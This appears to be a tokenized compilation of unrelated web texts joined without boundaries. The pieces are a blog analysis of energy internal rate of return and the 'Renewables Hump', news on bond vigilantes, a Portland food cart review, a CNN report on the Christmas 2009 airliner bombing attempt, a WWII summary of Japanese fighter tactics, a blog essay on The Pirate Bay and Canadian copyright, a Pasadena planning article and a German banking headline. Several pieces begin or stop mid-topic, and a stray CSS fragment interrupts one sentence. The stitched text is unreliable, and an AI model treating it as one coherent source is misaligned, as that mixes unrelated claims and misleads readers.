This hectic rate of expansion leads me to believe that the time to open a new mine or mine section is at most 2 years , and the energy cycle will be even quicker at existing mines , when the full cycle between when the coal is mined and when it is burnt to produce electricity requires only the mining itself , transport to a coal plant , and perhaps a short period of storage at the plant .
Most coal plants only keep a week or two supply of coal on hand .
In contrast , Nuclear and Renewable energy ( with the exception of biofuels and biomass ) present an entirely different picture .
A wind farm can take less than a year to construct , it will take the full farm life of 20 years to produce the 10 to 30 EROI shown in the graph .
Solar Photovoltaic 's apparent EROI of around 9 looks worse when you consider that a solar panel has a 30 year lifetime .
Only a little of the energy in for Nuclear power comes in the form of Nuclear fuel over the life of the plant : most is embodied in the plant itself .
Jeff Vail has been exploring this concept on his blog and the Oil Drum .
He refers to the problem of the front - loading of energy investment for renewable energy as the Renewables Hump .
He 's also much more pessimistic than the above chart about the actual EROI of most renewables , and found this chart from The Economist which illustrates the up - front nature of the investment in Nuclear and Wind :
In terms of EROI timing , those technologies for which the cost of generation includes more fuel have an advantage , because the energy used to produce the fuel does not have to be expended when the plant is built .
In a steady state of technological mix , EROI is the most important number , because you will always be making new investments in energy as old investments outlive their useful lives and are decommissioned .
However , in a period of transition , such as the one we are entering , we need a quick return on our energy investments in order to maintain our society .
Put another way , Jeff Vail 's " Renewables Hump " is analogous to a cash - flow problem .
We have to have energy to invest it ; we can't simply charge it to our energy credit card and repay it later .
That means , if we 're going to keep the non-energy economy going while we make the transition , we can't put too much energy today into the long - lived energy investments we 'll use tomorrow .
To give a clearer picture of how timing of energy flows interacts with EROI , I will borrow the concept of Internal Rate of Return ( IRR ) from finance .
This concept is covered in any introductory finance course , and is specifically designed to be used to provide a single value which can be used to compare two different investments with radically different cash flow timing by assigning each a rate of return which could produce those cash flows if the money invested were compounded continuously .
Except in special circumstances involving complex or radically different size cash flows , an investor will prefer an investment with a higher IRR .
Energy Internal Rate of Return ( EIRR )
I first suggested that IRR be adapted to EROI analysis by substituting energy flows for investment flows in early 2007 .
I called the concept Energy Internal Rate of Return , or EIRR .
Since no one else has picked up the concept in the meantime , I 've decided to do some of the basic analysis myself .
To convert an EROI into an EIRR , we need to know the lifetime of the installation , and what percentage of the energy cost is fuel compared to the percentage of the energy embodied in the plant .
The following chart shows my preliminary calculations for EIRR , along with the plant lifetimes I used , and the EROI shows as the size of each bubble .
The most valuable energy resources are those with large bubbles ( High EROI ) at the top of the chart ( High EIRR . )
Because of the low EIRR of Photovoltaic , Nuclear , and Hydropower , emphasizing these technologies in the early stage of the transition away from fossil fuels is much more likely to lead to a Renewables Hump scenario in which we do n't have enough surplus energy to both make the transition without massive disruption to the rest of the economy .
How to Avoid a " Renewables Hump "
Note that the three fossil fuels ( oil , gas , and coal ) all have high EIRRs .
As we transition to lower carbon fuels , we will want to keep as many high EIRR fuels in our portfolio as possible .
The chart shows two renewables with EIRRs comparable to those of fossil fuels :
Wood cofiring , and Wind .
Wood cofiring , or modifying existing coal plants to burn up to 10 % wood chips instead of coal was found to be one of the most economic ways of producing clean energy in the California RETI study .
The scope for incorporating biomass cofiring is fairly limited , however , since it requires an existing coal plant ( not all of which are suitable ) as well as a local supply of wood chips .
Some coal plants may also be converted entirely to wood , but only in regions with plentiful supplies of wood and for relatively small plants .
The EIRR for this should fall somewhere between Wood cofiring and Wood Biomass , which is intended to represent the cost of new wood to electricity plants .
Natural Gas
To avoid a Renewables Hump , we will need to emphasize high - EIRR technologies during the transition period .
If domestic natural gas turns out to be as abundant as the industry claims ( there are serious doubts about shale gas abundance , ) then natural gas is an ideal transition fuel .
The high EIRR of natural gas fired generation arises mostly because , as shown in the chart " it 's a gas " most of the cost ( and , I assume energy investment ) in natural gas generation is in the form of fuel .
Natural gas generation also has the advantage of being dispatchable with generally quick ramp - up times .
This makes it a natural complement to the variability of solar and wind .
However , I think it is unlikely that we 'll have enough domestic natural gas to both ( 1 ) rely much more heavily on it in electricity generation and ( 2 ) convert much of our transportation fleet to natural gas , as suggested by T Boone Pickens .
We 're going to need more high - EIRR technologies to manage the transition .
Fortunately , such technologies exist : the more efficient use of energy .
Energy Efficiency and Smart Growth
I have been unable to find studies of the EROI of various efficiency technologies .
For instance , how much energy is embodied in insulation , and how does that compare to the energy saved ?
We can save transportation fuel with Smart Growth strategies such as living in more densely populated areas that are closer to where we work , and investing in mass transit infrastructure .
The embodied energy of mass transit can be quite high in the case of light rail , or it can be very low in the case of better scheduling and incentives for ride sharing .
Many efficiency and smart growth technologies and methods are likely to have much higher EIRRs than fossil fuels .
We can see this because , while the embodied energy has not been well studied , the financial returns have .
Typical investments in energy efficiency in utility run DSM programs cost between $ 0.01 and $ 0.03 cents per kWh saved , much less than the cost of new fossil - fired generation .
This implies a higher EIRR for energy efficiency , because part of the cost of any energy efficiency measure will be the cost of the embodied energy , while all of the savings are in the form of energy .
This relationship implies that higher IRR technologies will generally have higher EIRRs as well .
Smart growth strategies also often show extremely high financial returns , because they reduce the need for expensive cars , roads , parking , and even accidents [ pdf . ]
Conclusion : Brain or Brawn
The Renewables Hump des not have to be the massive problem it seems when we only look at supply - side energy technologies .
By looking at demand side solutions , such as energy efficiency , conservation , smart growth , and transit solutions , we need not run into a situation where the energy we have to invest in transitioning from finite and dirty fossil fuels to limitless and clean renewable energy overwhelms our current supplies .
Efficiency and Smart Growth are " Brain " technologies , as opposed to the " Brawn " of traditional and new energy sources .
As such , their application requires long - term planning and thought .
Cheap energy has led to a culture where we prefer to solve problems by simply applying more brawn .
As our fossil fuel brawn fades away , we will have to rely on our brains once again if we hope to maintain anything like our current level of economic activity .
LONDON 
The bond vigilantes are back .
But this time they are roaming mostly through Europe rather than the United States  at least for now .
Their mission : to force governments to cut budget deficits that have ballooned in the wake of the financial crisis .
As big investors in the credit markets , activist bond traders developed a fearsome reputation in the early 1990s by pushing up yields on Treasuries in order to force the government to tame large deficits .
Their most famous target was a newly elected president , Bill Clinton , whom they pressured to abandon campaign promises of tax cuts .
Today , the bond market posse has set its sights on Europe  particularly Britain and Greece  where stagnant economies and high levels of government spending have led to the highest budget deficits in the region .
Although the left - leaning governments in both countries are struggling to show investors that they have a workable plan to reduce deficits  which now average around 13 percent of gross domestic product  bond traders are increasingly demanding higher interest rates to reflect the rising risks .

CLOSED – Restaurant open on N Williams
Location : SW 10th and Washington
Hours : Weekday lunch
Description :
The People ’s Pig has re-opened at the corner of SW 10th and Washington .
Cliff Allen is back with a new cart and a twist – a mesquite grill .
No gas , no electricity , just mesquite .
The product that comes off the grill is excellent .
Flank steak sandwich with arugula and lemon , pork polpette sandwich with peppers and onion .
Every now and then , he ’ll roast a pig or maybe some ribs .
Our original writeup about Cliff and the People ’s Pig is below .
Enjoy .
Pork !
Need I say more ?
I turned the corner and there it was , a bright yellow wood paneled food truck with a small crowd in front .
I knew a new food cart had arrived .
My heart skipped a beat when I saw the cart was named The People ’s Pig . Everyone loves pork ….
well almost everyone .
I walked right up , glanced at the couple of items on the menu and ordered up a sandwich from Cliff , the owner of this cart – now 2 days old .
Porchetta is the name of the sandwich .
Porchetta is pork , wrapped in pork .
Traditionally , a whole pig deboned and then put together in layers with aromatics and roasted , The People ’s Pig does it slightly different .
Cliff takes a pork tenderloin , seasons it , ( I saw chunks of garlic in there ) then stuffs it inside a pork belly to be roasted .
When he showed me the finished product , I just stood there , mouth agape .
The People ’s Pig Porchetta sandwich is layers of the porchetta with arugula on good bread .
My sandwich came with some picked peppers Cliff was offering .
When he handed the sandwich over , I just stared at it .
What a sight !
Passers by stopped to ogle .
Such an amazing culinary treat I was about to dive into .
The sandwich was great .
The layers of pork mixed with the bitterness of the arugula and the spiciness of the peppers was almost too much .
A few times , I had to stop and just take it all in – a great sandwich here .
The People ’s Pig is brand spankin’ new .
If you head down there in this first week , they just may be a line .
Like I have been telling everyone who asks – what make ’s Portland unique is that when cart owners decide on a product , they pick something no one else is doing and they do it right .
The People ’s Pig is making porchetta and from my experience , they are doing it right .
Walk on down to The People ’s Pig and grab a sandwich – maybe share one with a friend – and tell them Food Carts Portland sent ya .
Sample Menu :
See their Facebook page or the cart for current menu .

( CNN ) --
The father of terrorism suspect Umar Farouk AbdulMutallab talked about his son's extremist views with someone from the CIA and a report was prepared , but the report was not circulated outside the agency , a reliable source told CNN's Jeanne Meserve on Tuesday .
Had that information been shared , the 23 - year - old Nigerian who is alleged to have bungled an attempt to blow up a jetliner as it was landing in Detroit , Michigan , on Christmas Day might have been denied passage on the Northwest Airlines flight , the source said .
U.S. officials said the father , a former Nigerian banker , expressed his concerns about his son's radicalization during at least one meeting and several calls with officials at the embassy in Nigeria .
The information on AbdulMutallab had been sent to CIA headquarters in Langley , Virginia , but it sat there for five weeks and was not disseminated , the source said .
Federal authorities have charged AbdulMutallab with trying to detonate explosives hidden in his underwear as the flight from Amsterdam , Netherlands , made its final approach to Detroit .
The device failed to fully detonate , instead setting off a fire at his seat .
An administration official who spoke on condition of anonymity said the federal government had information that should have been assessed and meshed with other information " that would have allowed us to disrupt the attempted terrorist attack " before the suspect boarded the jet .
" What we have here is a situation in which the failings were individual , organizational , systemic and technological , " the official said .
" We ended up in a situation where a single point of failure in the system put our security at risk , where human error was compounded by systemic deficiencies in a way that we cannot allow to continue . "
But an intelligence official said that the son's name , passport number and possible connection to extremists were indeed disseminated .
" I 'm not aware of a magic piece of intelligence somehow withheld that would have put AbdulMutallab on the no-fly list , " the official said .
State Department spokesman Ian Kelly said department staff did what they were supposed to have done by sending a cable to the National Counterterrorism Center in Washington about the matter .
Kelly said any decision to have revoked the suspect 's visa would have been an interagency decision .
But a U.S. government official said the information in the cable offered nothing specific and was just one of hundreds of such reports that the center evaluates daily .
The bureaucratic fingerpointing erupted shortly after President Obama on Tuesday blamed " a mix of human and systemic failures " for the incident and directed that preliminary findings into the matter be delivered to the White House by Thursday .

JAPANESE FIGHTER TACTICS
Japanese fighter tactics against both Allied fighters and bombers necessarily vary both with the number and type of aircraft encountered , and with the conditions under which attacks are executed .
The normal tactical unit is a squadron of nine planes subdivided into three flights , in either Vee or echelon formation .
Another frequently employed formation consists of a Vee of three fighter aircraft , flanked by echelons of two fighters .
The latter formation is customarily used for ground attack , the echelon pairs meeting the fighter opposition while the Vee goes in to attack .
The fighter formations usually fly at altitudes of 15,000 to 20,000 feet , but are said to operate efficiently at 27,000 feet or higher .
Japanese fighter pilots generally avoid head - on attacks against Allied fighters , probably because most of their planes are unarmored .
" Head - to - tail " attacks are favored , except when engaging bombers with rear guns .
Contrary to an earlier belief , the Japanese appear to prefer single to concerted attacks .
They are now following our fighters into power dives , which heretofore they were reported reluctant to do .
Apparently the structural strength of the new Hap , in particular , has made this method of escape for Allied aircraft less effective .
Attacks against our fighter aircraft have been most frequently made from above and the side , and , if possible , out of the sun .
Recently , Japanese fighters are reported to be making a series of tight turns and then climbing steeply for a head - on attack .
After attacking , they do a turn resembling an Immelmann , climbing up and flipping over to a half roll at the top of the loop .
When pursued by our fighters , they frequently resort to evasive action , while pulling into Immelmanns and loops .
In the Aleutians , it has been observed that a Japanese Rufe , when given the advantage of altitude in a head - on attack , dives on his opponent and levels off just out of firing range .
He usually rolls on his back as he passes over the Allied plane , and does a snap roll onto our fighter 's tail .
According to many observers , the moment of greatest vulnerability for the Japanese pilot is during the pull - out from a head - on attack , since our fighters are afforded a good shot when the enemy aircraft is in the process of making a slow roll or a climbing turn .
When a head - on attack is not possible , Japanese fighters sometimes attempt an Immelmann or a steep chandelle before diving onto the enemy .
When a Japanese fighter approaches an Allied fighter aircraft broadside , from below , or at the same level , he fires a short burst and does a semi - half roll , usually to the left .
He then comes back up in a steep climb and attacks again .
When a climbing attack is made on a Japanese fighter , he remains just out of range until the pursuing plane begins to stall .
Executing a quick turn , he brings his guns to bear on the Allied plane when it is a relatively easy target .
Japanese pilots are particularly adept in employing " decoy " tactics .
The fighters sometimes fly in circles , one above the other , at different altitudes .
When one of the lower aircraft is attacked , the aircraft above it dive successively onto the opposing fighters , usually approaching from behind or slightly below .
A similar ruse has been employed by three - plane formations .
When encountered by a pair of Allied fighters , the right - or left - wing pilot of the formation peels off and dives .
If one of our fighters follows , he becomes easy prey for the remaining two Japanese aircraft .
In another deceptive maneuver , Japanese fighters attempt to draw our aircraft , particularly stragglers , into combat for the purpose of exhausting their fuel supply by the time succeeding Japanese fighters arrive to attack .
These tactics are also used to enable Japanese bombers to carry out their missions after our fighters have been forced down .
A faked dogfight is often staged to make it appear that one of our planes is engaged , so that the others will come to its rescue .
According to a pilot in the Netherlands East Indies , a fighter , with Allied aircraft on its tail , decelerated suddenly by using his flaps and side slips .
When the attacking aircraft overshot , the fighter came up underneath and fired on him .
Smoke cartridges are also reported to be employed by Japanese pilots after beginning a spin downward to create the impression that they have been knocked out .
Escort fighters for bombardment aircraft have been observed above , below , and to the side of the bombers .
In approaching their target , the bombers usually fly at approximately 25,000 feet , but have been encountered as high as 29,000 feet .
The protecting aircraft may sometimes fly 6,000 feet below and about 2 miles behind the bombers , or they may fly about 10 miles to the side , below or above them or at the Same level .
Fighters have also been known to trail the bombers at least 10 miles , although that distance gives Allied aircraft a decided advantage .
Covering aircraft have , in one instance , been reported to fly above the bombers in varying positions at altitudes as high as 35,000 feet .
Fighter escort planes , however , have been most frequently encountered under the bombers ; in this case , our fighters , having the advantage of speed gained in a dive on the bombers , have attacked successively the bombardment planes and the fighters below them .
Currently , Japanese pilots are attacking both heavy and medium bombers from all directions , but the frontal attack is most frequently employed against our Fortresses in order to avoid the heavy fire of their rear guns .
Tail attacks , sometimes made simultaneously with bow attacks , continue to be reported , as well as beam attacks and attacks from directly underneath .
During the Battle of Midway , two enemy fighters attempted interception of two three - plane elements of Fortresses , firing first at the wing ships , rolling and taking a shot at the lead ship , falling off , and then pulling back to make successive attacks .
Subsequently , one Japanese aircraft flew in the path of the bombers , but far ahead , and after about 30 minutes made a right chandelle and attacked from the frontal quarter .
An instance of rear attack was recently reported from Guadalcanal .
Two floatplane fighters , probable Rufes , approached a B - 17E at 10,000 feet , one breaking away at 500 yards and concentrating on the bomber 's underside .
A third enemy fighter did not take part in the action , but remained about 3 miles away at the same altitude as the bomber .
A second attack , also from below , followed quickly :
One of the fighters went into a slow roll at 7,500 feet , pulled up into a steep climb , and aimed at the belly of the bomber .
During the engagement , both fighters jockeyed back and forth , avoiding a straight approach .
A recent report indicates that Japanese fighters now attack medium bombers from a position parallel to the bombers ' line of flight but at a lower altitude .
The fighters chandelle up into the bomber formation , rolling out and diving down to the opposite side , from which a new attack is begun .
This maneuver , which is similar to a lazy eight , is repeated again and again .
Frequently employed tactics against the B - 26 involve a two - element attack , one aircraft on the right and two on the left , just out of range of the bomber .
The single plane turns into the bomber to block out its turret and nose - gun fire , and then passes under the B - 26 to take the left flank , while the other two planes change over to the right .
In early operations , Japanese employed two principal methods of ground attack , which are still considered effective .
In the first attack , fighters come in just over the trees , dive on an Allied airdrome , machine - gun grounded aircraft and antiaircraft emplacements and then fly away in horizontal formation at low altitude .
In the case of one such attack , a fighter remained to circle the field at an altitude of 12,000 to 18,000 feet , apparently to observe the results of the attack .
Shortly afterward , the Japanese launched a new attack , probably making use of information gained from the observation .
A second method of attack is illustrated by operations against Palembang .
A Japanese fighter flew over an airfield and attacked with machine guns while one or more flights of aircraft remained at altitudes of 16,000 to 20,000 feet .
When defending Allied fighters attempted to get into the air , the Japanese planes immediately dived upon them at high speed .
In a similar attack , the Japanese fired tracer and , when this scored , followed with 20 - mm explosive .
They passed the targets at a height scarcely over 25 feet , flew about 50 yards beyond the edge of the field , and after making easy turns , repeated the attack again and again .
More recently Japanese naval floatplanes , in loose echelon formation , flew over an Allied airdrome at 5,000 to 6,000 feet , and after circling it , peeled off , and executed organized machine - gun attacks , commencing fire at 1,500 feet .
The planes then pulled out in a low turn and made independent low - altitude attacks .
Timing of all attacks on ground installations has been well coordinated .
So I ’ve wanted to write about this for a while , but as some of you have pointed out , my research skills have been somewhat less than “ mad ” recently , owing to a distinct lack of passion on my part .
On that note , let me be the first to apologize for my spotty update schedule of late – I ’ve been embroiled in some silliness recently that is on its way out the door as of now , so you can expect a return to the high standards of cynicism you ’ve come to expect from old Uncle Alex .
Like most kids , I really dug the idea of pirates .
Oh , not real pirates – those guys were downright scary .
I mean , seriously – slave trading , rape and wanton butchery are n’t the sort of practices to which most seven year old children should aspire .
No , it was the romanticized ideal of piracy that drew me – the brave pirate captain battling the oppressive Powers That Be on the high seas was an image comparable , in my mind , to the likes of Robin Hood .
For those of you who remember the Muppets ’ take on R. L. Stevenson ’s immortal “ Treasure Island ” , pirate extraordinaire Long John Silver ( played by the ever - awesome Tim Curry ) sang his “ one and only number ” espousing the virtues of the pirate lifestyle :
“ Now take Sir Francis Drake , the Spanish all despise him
But to the British he ’s a hero and they idolize him
It ’s how you look at buccaneers that makes them bad or good
And I see us as members of a noble brotherhood ! ”
Now obviously , this song was written with comedic intent ( and to comedic effect if I remember the movie correctly ) and it is n’t meant to glorify the kind of violence perpetrated by real - life pirates .
I do n’t think anybody is going to leap to the defense of Somali pirates who sail gleefully all over the place , hijacking everything from yachts to oil tankers and generally making a nuisance of themselves .
I have to admit hijacking a ship the size of one of those monstrous oil tankers is kind of impressive , but I ’m still not condoning the behaviour .
Or am I ?
I think piracy , at least the way it ’s perceived in the public consciousness , can be compared reasonably to something like freedom - fighting .
Like Tim said , it ’s all about how you look at it .
Our media tends to glorify people who fight the system , so to speak , especially if it ’s for a cause enough people can get behind .
You ’re never going to hear anyone call Nelson Mandela a “ terrorist ” , because he was fighting for a cause a lot of people believe in , and therefore he ’s a “ freedom fighter ” .
On some level , people can accept violence when it ’s couched in the rhetoric of a “ greater good ” because in a very pragmatic way , fighting to end apartheid justifies killing some folks , and therefore we perceive Nelson Mandela as essentially a good man who had to do some pretty terrible things in the name of his cause .
It ’s a pithy analogy , but look at the way Hollywood portrayed Jack Sparrow – possibly the most famous pirate - that - never - was in history .
If you take a step back and look at the character in its entirety , he ’s kind of a terrible guy : he ’s a violent drunkard who is willing to play both sides of any conflict in the interest of seeing the best possible outcome for himself .
But the roguish spirit , charisma and sense of humour that come through so strongly in Johnny Depp ’s portrayal somehow excuse his selfishness .
It ’s the whole “ knave with a heart of gold ” trope we all love so much – characters who seem to exist only for self - gratification , but who step up and do “ what ’s right ” when it counts .
I ’ll buy that coming from anti-heroes of the Han Solo school , but not from Sparrow , because you get the overriding sense that he would have done what was best for him either way , and just because it so happened the outcome was beneficial to the other heroes of the story , does n’t mean the “ greater good ” was his motivation .
And yet , the character has become one of the more enduring in recent history , because people believe what they want to believe and see what they want to see .
But of course I ’m not dedicating an entire article to my philosophical take on piracy for no reason .
No , like I said at the beginning , I ’ve been wanting to write about this issue for a while , but I ’m only getting around to it now .
I ’m referring to The Pirate Bay , possibly the most well - known and controversial BitTorrent site on the internet .
And it ’s not because of the obvious nomenclature that I bring up the subject of pirates .
A lot has been made over the last fifteen or so years of the so - called internet piracy phenomenon , and as an artist with a personal stake in how copyright laws work , I have something to say about the saga of The Pirate Bay specifically .
For those of us who have spent the last decade and a half living on a deserted island , subsisting on coconuts and monkey flesh , the story of The Pirate Bay ( or TPB ) is rooted in the practice of file - sharing .
The term itself refers to the transmission of digitally - stored information through several channels : removable media like USB keys , internet - based hyperlinked documents , and peer - to - peer networking programs are among the most common .
The legal ramifications of file sharing gained prevalence in the mid-90s as a result of the infamous Metallica versus Napster debacle , which culminated in the termination of many websites catering to P2P networking thanks to the efforts of organizations like the RIAA and the MPAA .
As we near the end of this century ’s first decade , however , the popularity of file sharing as a means to circumvent what many people see as unfair costs levied upon media fans ( the most obvious being film , television and music ) has not decreased .
In the interest of being as specific and correct as I can be with regards to this issue , I ’ve been doing some reading on Canadian copyright law .
Now , I ’m no lawyer ( though one of my longtime friends and correspondents , Adam Grant of Two Assholes Talking About Nerd Stuff , actually is a practicing lawyer – you can find some of his thoughts on recent copyright controversy here ) so I ’m not suited to slog through page after page of legal rhetoric in an attempt to make a point , but I ’m going to try anyway .
According to the Canadian Copyright
Act as it relates ( for the purpose of this example ) to audio recordings :
Copying for Private Use
Where no infringement of copyright .
(1) Subject to subsection ( 2 ) , the act of reproducing all or any substantial part ofa ) a musical work embodied in a sound recording , b ) a performer ’s performance of a musical work embodied in a sound recording , or c ) a sound recording in which a musical work , or a performer ’s performance of a musical work , is embodied
onto a recording medium for the private use of the person who makes the copy does not constitute an infringement of the copyright in the musical work , the performer ’s performance or the sound recording .
Limitation
Subsection ( 1 ) does not apply if the act described in subsection ( 1 ) is done for the purpose of doing any of the following in relation to any of the things referred to in paragraphs ( 1 ) ( a ) to ( c ) : a ) selling or renting out , or by way of trade exposing or offering for sale or rental ; b ) distributing , whether or not for the purpose of trade ; c ) communicating to the public by telecommunication ; or d ) performing , or causing to be performed , in public .
See what I mean about legal jargon ?
Good lord , it ’s small wonder entire educational institutions are designed from the ground up to teach people how to communicate in this fashion .
It ’s like reading Greek by way of Pig Latin after running it through Babel Fish four or five times .
The bottom line is this : it ’s not illegal to download an artist ’s entire catalogue of music , nor is it illegal to have it on your hard drive .
What is illegal is distributing it .
So it ’s sort of like cigarette sales : it ’s not illegal for a minor to smoke , but every way they could conceivably get their hands on cigarettes ( through sale , gift or otherwise ) is illegal , so that makes somebody accountable somewhere along the line .
In this case , at least in Canada , that makes The Pirate Bay accountable ( this is a pirate story , remember ? ) .
But let ’s take a little look at TPB before we set them up to be drawn and quartered , shall we ?
TPB was established in 2003 by a Swedish anti-copyright organization called Piratbyrån or “ The Piracy Bureau ” with the site officially becoming an idependent entity a year later .
TPB quickly gained popularity among the file - sharing crowd , rising to an Alexa rating of 105 ( yes , that means it ’s the 105th most popular website on the whole internet ) .
Controversy first struck in 2006 when TPB ’s offices were raided by Swedish authorities , resulting in the loss of a great deal of server equipment – but remarkably , the site was back up and running inside three days .
Even more shockingly , the public backlash against the Swedish government and in favour of TPB resulted in a huge rise in popularity for Sweden ’s state - registered “ Pirate Party ” – by 2007 , membership in the party had risen to the point of being on par with the Swedish Green Party .
The site has remained up and running since , despite constant legal attacks on the site and its proprietary <! – @page { margin : 2 cm } P { margin - bottom : 0.21 cm } A:link { so - language : zxx } –>
owners Peter Sunde , Fredrik Neij , Gottfrid Svartholm and Carl Lundström .
These four were charged in April of this year with “ assistance to copyright infringement ” and sentenced to one year in prison and individual fines of about $ 3.6 million USD .
They immediately appealed the charges .
Unable to strike directly at the site ’s owners due to some savvy legal dodging , the enemies of TPB struck at the source , threatening the ISP itself with huge fines if they continued to host the site .
Initially , the move worked and the site went down , but in short order it was back again on another ISP .
When that provider backed out due to similar pressure , they moved again .
And again .
At the end of October , the Stockholm District Court forbade Svartholm and Neij from operating the site .
So they sold TPB to a private interest and moved out of Sweden , disabling their Swedish tracker as they went , which effectively nullified the court ’s threat .
According to an article on TorrentFreak ,
“ [ B]ecause [ TPB ] no longer operates a tracker of its own it is much less responsible for the infringements of others than it was before .
This potentially paves the way for the ban on the site to be lifted .
Furthermore , while the founders are banned from running the site in Sweden , they say they no longer run it .
But in any event , neither of them live in Sweden .
In the meantime , the site remains up . ”
So the long and the short of it is TPB has managed to duck and weave around every conceivable legal action taken against them , and while I ’m sure the site will eventually go under ( either due to some kind of unified stand against them , or else being outpaced by another , more advanced torrent site ) for now they seem to be staying one step ahead of the authorities .
They are n’t kidding when they call themselves pirates , are they ?
But here ’s the rub for me .
I find my little boy , pirate - worshipping self fundamentally at odds with my current , internet - savvy musician self , and I ’ll be honest when I say I do n’t know who ’s winning that internal war .
You see , I was raised in the music industry .
My father is a musician and I was brought up around him and his friends and compatriots on and off the stage , so my take on music as an occupation is somewhat different ( read , more jaded ) than that of my contemporaries .
More than anything else , I got into music because I love to do it – I love to write , I love to play guitar , and I really , really love being onstage .
But I ’ve never harboured any delusions that I ’d make any money at it .
My father always told me that real musicians have day jobs , and from what I ’ve seen growing up , he could n’t be more right .
I ’ve been privy to some pretty amazing talent in my life – I ’ve seen musicians you ’ve never heard of ( and you never will ) quite literally wipe the stage with other acts , and guess what ?
Ninety percent of them do n’t make their primary income from playing .
They work in all sorts of fields , and music – while I hate to trivialize the love of it by using this word – is pretty much relegated to the status of “ hobby ” out of necessity – you have to have a roof over your head and food in your stomach if you ’re going to go out and play , and if you ca n’t make enough cash to facilitate those basic needs with nothing but your guitar and your guts , you have to bite the bullet and go do some lifeless , soul - sucking “ job ” if you want to keep it up .
If you ’re lucky , you might make just enough to keep touring and getting your music out there , and for those hard - working bands who are just trying to make it to their next gig , yeah – I feel it if they ’re pissed that someone is downloading their content from somewhere like TPB and they ’re getting cut out of the fiscal loop .
That ’s why I try to make a point of purchasing independent or small - label music if I like it , put it on my computer and show it to friends and associates in the interest of promoting music I think is great .
I do n’t give it away ; I expose it in the hope that other people I know will also like and buy it .
There ’s also the question of P2P sharing as a vehicle for proliferation .
I regularly give my music to friends and family in recorded format , and I have no problem with them giving it to other people , as long as it ’s material I ’ve already made headway into securing .
I personally work with the Song Vault maintained by the Songwriter ’s Association of Canada , which is exactly what it sounds like : I record music and send it to them , and if somewhere down the line someone tries to pass off my stuff or an obvious derivative as their own , I call up SAC and they pull my copy out of the Vault as evidence for a court case .
That ’s my biggest problem with P2P sharing : not that people have free access to my music , but that they could steal it in an intellectual sense .
And realistically , that ’s not going to be an issue for the big - name bands that seem to have such a problem with P2P .
Nobody ’s going to believe for a second that I wrote and recorded a song that sounded remarkably like “ Enter Sandman ” .
Their problem is n’t intellectual theft – it ’s just that they want to get paid for their intellectual property , and on some level I understand that .
But it ’s still difficult to swallow for me when a band already making millions on ticket sales and merchandise and whatever has a psychotic break about me having not paid for my copy of their platinum record .
Do they really need my money that much , or is it a question of principle ?
I love the internet and that ’s a fact .
I love the ability it grants me to check out bands I might like so I can go to their show later and tell other people about it .
I ’ve said before the internet is the most democratic invention in history , precisely because it does n’t put restrictions on what you can and ca n’t access .
And yeah , that ’s a bit of a Pandora ’s Box issue because I could conceivably be accessing all sorts of terrible stuff – child porn comes to mind .
But fundamentally , you have to consider the fact that almost everyone who uses the internet has downloaded something illegally in the past .
There ’s obviously a demand for it .
So does that make TPB the pirates for providing access , or does it make us the criminals for wanting something for free ?
I personally think it ’s a little of both .
Like I said before , it ’s difficult for me to swallow when I hear about musicians or movie makers who complain about the loss on their paycheque thanks to file sharing , because it ’s comparatively rare to hear these complaints coming from the indy circuit – it ’s almost always some overpaid hack of a musician or the guys who make movies like Twilight that end up getting the publicity when they come out to bitch .
Contrarily , most of the people I know in the indy circuit already give away their music in the hopes of getting some attention .
But that does n’t mean artists should n’t have a say , and at the end of the day , no matter what I think , uploading content that is n’t yours to be downloaded for free is still illegal – there ’s no getting around that .
But I think on some level we need entities like The Pirate Bay .
The internet is still a relatively new tool ( relative to , say , the printed word ) and as a culture we ’re still feeling out what is going to be okay and what is n’t .
If TPB had folded immediately back in 2006 , the controversy would n’t be generated and I would n’t be writing about this today .
In fact , there ’s a good possibility that if controversy was n’t driven by those who do n’t share the opinions of the censors , I might very well not be writing this blog at all , unless it was to sell meaningless products or espouse political viewpoints fed to me by my handler .
Maybe that ’s where the romanticism of pirates has always come from .
It ’s easy to forget the fact that they ’re essentially criminals when everything about their presentation makes us think of them as free - spirited bandits who fight the faceless Man to ensure we keep getting to watch Curb Your Enthusiasm without having to buy an overpriced DVD set .
And the way the current Canadian law is set up , they ’ll take the fall for us if someone shuts them down .
No wonder we think they ’re great guys .
But I ’d like your thoughts on this issue .
Do you think TPB is ahead of the curve when it comes to the future of how we ’ll use the internet , or are they just bottom - feeding Bluebeards with a penchant for coding ?
Hit me up in the comment section .
Every thought - out comment gets a response .
PASADENA – The city ’s general plan helps determine the future of Pasadena housing , transportation and open space , but few residents have likely heard of it .
That ’s why city officials held an open house on Saturday , to encourage residents to offer their input on the plan .
The event featured a series of speakers and discussions , and a chance for the public to interact with city staff members to discuss the city ’s priorities in the general plan .
Councilman Terry Tornek acknowledged the difficulty in explaining the plan to the public .
“ While the plan might seem abstract and mysterious , it has tremendous impact on how the city feels and looks , ” he said .
The general plan is updated every five years , and every city in the state is legally required to have one .
It deals with open space , transportation , housing density and several other related topics .
Pasadena has been holding public meetings over the last few months to gauge residents ’ concerns .
Topping the list were overdevelopment , overpopulation , a shortage of parks and accessible open space , high density and traffic .
The next step is for a city council - appointed committee to take those concerns and integrate them into an updated draft of the plan , which will happen sometime in spring 2010 .
Forming a plan that can help address all the concerns expressed by residents can be challenging .
For example , concentrating housing in an area that also has shops and restaurants – such as in central Pasadena – can help reduce car use because it encourages people to walk .
But based on how people are responding to the idea of high - density zones , trying to reduce traffic that way might be a tough sell , said Julianna Delgado , a professor of urban planning at Cal Poly Pomona who is serving on the general plan committee .
“ It ’s up to the people , and the current climate would seem to be against increasing density , ” said Delgado .
Reducing traffic has been a challenge for the city over the years .
A city surveyed showed that despite increases in walking and biking to work from 1990 to 2008 , the overall number of people driving to work in cars by themselves has increased .
That ’s largely due to a big reduction in carpooling .
Combined with an increase in population and continued commercial development , it highlights the problems the city faces with traffic .
Concerns are not limited to just overdevelopment and traffic , though .
Other priorities include a lack of affordable housing and a lack of focus on northwest and eastern Pasadena neighborhoods .
A good way to start dealing with those issues would be increased public outreach in northwest Pasadena , said Ishmael Trone , who works on a city committee focused on the development of the Fair Oaks Avenue area .
“ They need to hold one of these events on the other side of town , ” Trone said Saturday .
“ They ’re concerned about low turnout for this process , so that would be a way to get the numbers up . ”

Verdacht auf schwere Untreue Hunderte Ermittler filzen Landesbank LBBW
Großeinsatz bei der Landesbank Baden - Württemberg : 240 Ermittler haben Büros des staatseigenen Finanzinstituts in Stuttgart und zehn Privatwohnungen durchsucht .
Mehrere Vorstandsmitglieder stehen im Verdacht der schweren Untreue bei riskanten Finanzgeschäften - darunter auch ein Ex-Vorstandschef .
